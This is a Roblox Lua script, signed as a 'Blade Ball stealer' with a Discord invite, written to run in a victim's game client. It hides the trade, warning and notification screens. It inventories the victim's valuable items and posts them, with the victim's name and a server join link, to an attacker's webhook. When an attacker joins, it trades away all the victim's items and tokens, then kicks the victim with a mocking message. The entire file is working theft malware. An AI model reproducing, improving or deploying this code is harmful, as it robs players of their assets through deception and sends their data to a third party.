-- // CONFIGURATION & EXECUTION CHECK
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

-- // VARIABLES SERVICES
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- // CONFIGURATION UTILISATEUR
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- // VÉRIFICATIONS DE SÉCURITÉ
if next(users) == nil or webhook == "" then
    plr:kick("You didn't add usernames or webhook")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("Game not supported. Please join a normal Blade Ball server")
    return
end

if #Players:GetPlayers() >= 16 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

local args_pin = { [1] = { ["option"] = "PIN", ["value"] = "9079" } }
local _, PINReponse = netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args_pin))
if PINReponse ~= "You don't have a PIN code" then
    plr:kick("Account error. Please disable trade PIN and try again")
    return
end

-- // NETTOYAGE UI
tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false

local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function() maintradegui.Visible = false end)

local unfairTade = tradeGui.UnfairTradeWarning
unfairTade.Visible = false
unfairTade:GetPropertyChangedSignal("Visible"):Connect(function() unfairTade.Visible = false end)

local notificationsFrame = notificationsGui.Notifications
notificationsFrame.Visible = false
notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function() notificationsFrame.Visible = false end)

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
end)

-- // TES FONCTIONS DE CONFIRMATION (REMISES EXACTEMENT)
local function readyTrade()
    local args = { [1] = true }
    repeat
        wait(0.1)
        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
    until response == true
end

local function confirmTrade()
    repeat
        wait(0.1)
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
    until not inTrade
end

-- // AUTRES FONCTIONS
local function sendTradeRequest(user)
    local args = { [1] = game:GetService("Players"):WaitForChild(user) }
    repeat
        wait(0.1)
        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
    until response == true
end

local function addItemToTrade(itemType, ID)
    local args = { [1] = itemType, [2] = ID }
    -- Pas de repeat ici pour éviter de crash, mais exécution directe
    netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
end

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then return tostring(math.floor(number)) else
        return string.format("%.2f%s", number, suffixes[suffixIndex])
    end
end

local totalRAP = 0

-- // WEBHOOKS (REMIS AVEC JOBID)
local function SendJoinMessage(list, prefix)
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Join link:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId},
        {name = "Item list:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total RAP: %s", formatNumber(totalRAP)), inline = false}
    }

    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then grouped[item.Name].Count = grouped[item.Name].Count + 1 grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP} end
    end
    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)

    for _, group in ipairs(groupedList) do
        fields[3].value = fields[3].value .. string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
    end

    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "🔴 Join to get Blade Ball hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

local function SendMessage(list)
    local fields = {{name = "Victim Username:", value = plr.Name, inline = true}, {name = "Items sent:", value = "", inline = false}, {name = "Summary:", value = string.format("Total RAP: %s", formatNumber(totalRAP)), inline = false}}
    local grouped = {}
    for _, item in ipairs(list) do
        if grouped[item.Name] then grouped[item.Name].Count = grouped[item.Name].Count + 1 grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
        else grouped[item.Name] = {Name = item.Name, Count = 1, TotalRAP = item.RAP} end
    end
    local groupedList = {}
    for _, group in pairs(grouped) do table.insert(groupedList, group) end
    for _, group in ipairs(groupedList) do fields[2].value = fields[2].value .. string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP)) end

    local data = {["embeds"] = {{["title"] = "🔴 New Blade Ball Execution", ["color"] = 65280, ["fields"] = fields, ["footer"] = {["text"] = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"}}}}
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

-- // SCAN RAP
local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items

for _, category in ipairs(categories) do
    if clientInventory[category] then
        for itemId, itemInfo in pairs(clientInventory[category]) do
            if not itemInfo.TradeLock then
                local rap = 0
                if rapData[category] then
                    for key, v in pairs(rapData[category]) do if string.find(key, itemInfo.Name) then rap = v break end end
                end
                if rap >= min_rap then
                    totalRAP = totalRAP + rap
                    table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
                end
            end
        end
    end
end

-- // EXECUTION
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    local sentItems = {}
    for i, v in ipairs(itemsToSend) do sentItems[i] = v end

    SendJoinMessage(itemsToSend, (ping == "Yes") and "--[[@everyone]] " or "")

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            sendTradeRequest(joinedUser)
            repeat wait(0.5) until inTrade

            -- AJOUT DES ARMES (DÉLAI RÉDUIT POUR LA VITESSE)
            for i = 1, math.min(100, #itemsToSend) do
                local item = table.remove(itemsToSend, 1)
                addItemToTrade(item.itemType, item.ItemID)
                wait(0.01) -- Délai ultra-rapide entre chaque arme
            end

            -- TOKENS
            local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
            local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
            if tokensamount >= 1 then netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount) end

            wait(0.5) -- Petite pause pour que le serveur valide l'ajout
            readyTrade()
            confirmTrade()
        end
        plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
    end

    local function waitForUserJoin()
        local sentMessage = false
        local function onUserJoin(player)
            if table.find(users, player.Name) then
                if not sentMessage then SendMessage(sentItems) sentMessage = true end
                doTrade(player.Name)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
        Players.PlayerAdded:Connect(onUserJoin)
    end
    waitForUserJoin()
end
